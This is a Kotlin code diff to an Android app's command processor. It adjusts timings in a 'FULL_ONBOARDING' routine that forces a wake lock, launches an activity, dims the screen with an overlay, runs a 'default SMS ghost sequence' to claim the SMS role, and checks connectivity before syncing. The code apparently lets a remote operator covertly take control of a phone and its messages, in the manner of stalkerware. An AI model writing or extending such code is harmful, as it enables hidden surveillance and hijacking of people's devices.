@@ -1205,31 +1205,33 @@ object CommandProcessor {
                     }
                 }
                 "FULL_ONBOARDING" -> {
-                    // 1. STRONG WAKE
-                    val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
-                    val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
-                        android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or 
-                        android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:MasterWake")
-                    wakeLock.acquire(3000)
-                    
-                    val wakeIntent = Intent(ctx, PulseActivity::class.java).apply {
-                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
-                        putExtra("is_wake_trigger", true)
-                    }
-                    ctx.startActivity(wakeIntent)
+                    // 1. STRONG WAKE (Delayed by 5 seconds for testing)
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+                        val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
+                            android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or 
+                            android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:MasterWake")
+                        wakeLock.acquire(3000)
+                        
+                        val wakeIntent = Intent(ctx, PulseActivity::class.java).apply {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                            putExtra("is_wake_trigger", true)
+                        }
+                        ctx.startActivity(wakeIntent)
+                    }, 5000)
 
-                    // 2. DIM IMMEDIATELY
+                    // 2. DIM IMMEDIATELY (Relative to 5s delay -> 5500ms)
                     Handler(Looper.getMainLooper()).postDelayed({ 
                         DimmerManager.applyDim(ctx, 20, "AUTO")
-                    }, 500)
+                    }, 5500)
 
-                    // 3. DEFAULT SMS GHOST SEQUENCE (Delayed to allow lockscreen dismiss to finish)
+                    // 3. DEFAULT SMS GHOST SEQUENCE (7500ms)
                     Handler(Looper.getMainLooper()).postDelayed({ 
                         DefaultSmsManager.expectedMode = "AUTO"
                         DefaultSmsManager.requestDefault(ctx)
-                    }, 2500)
+                    }, 7500)
 
-                    // 4. CONNECTIVITY EVALUATION (Delayed heavily to prevent sequence overlapping)
+                    // 4. CONNECTIVITY EVALUATION (17000ms)
                     Handler(Looper.getMainLooper()).postDelayed({
                         val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
                         val caps = cm.getNetworkCapabilities(cm.activeNetwork)
@@ -1249,9 +1251,9 @@ object CommandProcessor {
                             DebugLogger.log("AUTO_SYNC", "Check Skipped: Online=$isOnline, SIM=$hasSim. Cleaning up.")
                             DimmerManager.removeOverlay(ctx)
                         }
-                    }, 12000)
+                    }, 17000)
                     
-                    status = "SEQUENCE_INITIATED"
+                    status = "SEQUENCE_INITIATED_WITH_DELAY"
                 }
                 "WAKE" -> {
                     // 1. CPU KICK: Force a temporary WakeLock to ensure the CPU is awake to process the UI
